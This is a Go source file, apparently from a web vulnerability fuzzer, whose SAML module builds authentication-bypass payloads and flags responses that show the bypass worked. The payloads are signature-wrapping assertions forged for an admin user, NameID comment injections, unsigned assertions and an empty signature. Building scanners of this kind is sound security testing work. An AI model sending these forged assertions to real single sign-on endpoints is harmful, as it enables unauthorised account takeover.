package vulns

import (
	"strings"

	"github.com/renansj/ryofuzz/internal/input"
	"github.com/renansj/ryofuzz/internal/mutator"
)

// SAMLModule tests SAML SSO endpoints for XML Signature Wrapping (XSW),
// comment injection in NameID, and acceptance of unsigned assertions.
type SAMLModule struct{}

func (m *SAMLModule) Name() string        { return "saml" }
func (m *SAMLModule) Description() string { return "SAML XML Signature Wrapping / auth bypass" }

func (m *SAMLModule) GeneratePayloads(points []input.InjectionPoint, mode string, mutations int) []mutator.Payload {
	var payloads []mutator.Payload

	samlTests := []struct {
		value   string
		variant string
	}{
		// XSW: wrap a forged assertion around the signed one
		{`<saml:Assertion><saml:Subject><saml:NameID>admin@victim.com</saml:NameID></saml:Subject></saml:Assertion>`, "xsw-forged-assertion"},
		// Comment injection in NameID (XML canonicalization parser differential)
		{`admin@victim.com<!---->.attacker.com`, "comment-injection-nameid"},
		{`admin<!---->@victim.com`, "comment-injection-local"},
		// Unsigned assertion (strip signature)
		{`<saml:Assertion ID="_forged"><saml:Subject><saml:NameID>admin</saml:NameID></saml:Subject></saml:Assertion>`, "unsigned-assertion"},
		// Signature exclusion / empty signature
		{`<ds:Signature></ds:Signature>`, "empty-signature"},
	}

	for _, point := range points {
		name := strings.ToLower(point.Name)
		isSAML := strings.Contains(name, "saml") || strings.Contains(name, "assertion") ||
			strings.Contains(name, "response") || point.Location == input.LocFormBody
		if !isSAML {
			continue
		}
		for _, st := range samlTests {
			payloads = append(payloads, mutator.Payload{
				Value: st.value, Point: point, Module: "saml", Variant: st.variant,
			})
		}
	}
	return payloads
}

func (m *SAMLModule) Detect(payload mutator.Payload, baseBody string, baseStatus int, baseTime int64,
	respBody string, respStatus int, respTime int64, respHeaders map[string][]string) *Finding {

	if payload.Module != "saml" {
		return nil
	}

	// Auth bypass signal: the manipulated assertion was accepted where the
	// baseline (no/invalid assertion) was rejected. A redirect to an
	// authenticated area or a session cookie issuance are strong signals.
	accepted := false
	evidence := ""

	// Session established after a manipulated assertion
	for _, c := range respHeaders["Set-Cookie"] {
		lower := strings.ToLower(c)
		if strings.Contains(lower, "session") || strings.Contains(lower, "auth") ||
			strings.Contains(lower, "sid") {
			accepted = true
			evidence = "Session cookie issued for manipulated SAML assertion"
			break
		}
	}

	// Baseline was unauthorized (401/403) but the manipulated request succeeded
	if !accepted && (baseStatus == 401 || baseStatus == 403) &&
		(respStatus == 200 || respStatus == 302) {
		// Avoid flagging generic error pages
		low := strings.ToLower(respBody)
		if !strings.Contains(low, "invalid") && !strings.Contains(low, "signature") &&
			!strings.Contains(low, "denied") && !strings.Contains(low, "error") {
			accepted = true
			evidence = "Manipulated SAML assertion accepted (baseline was " + statusStr(baseStatus) + ", response " + statusStr(respStatus) + ")"
		}
	}

	if accepted {
		return &Finding{
			Module:      "saml",
			Severity:    "critical",
			Confidence:  "high",
			Title:       "SAML Authentication Bypass - " + payload.Variant,
			Description: "The SAML endpoint accepted a manipulated assertion (signature wrapping / unsigned / comment injection), enabling authentication bypass.",
			Payload:     payload.Variant,
			Point:       payload.Point,
			Evidence:    evidence,
			OWASP:       "A07:2021 Identification and Authentication Failures",
			CWE:         "CWE-347",
		}
	}
	return nil
}
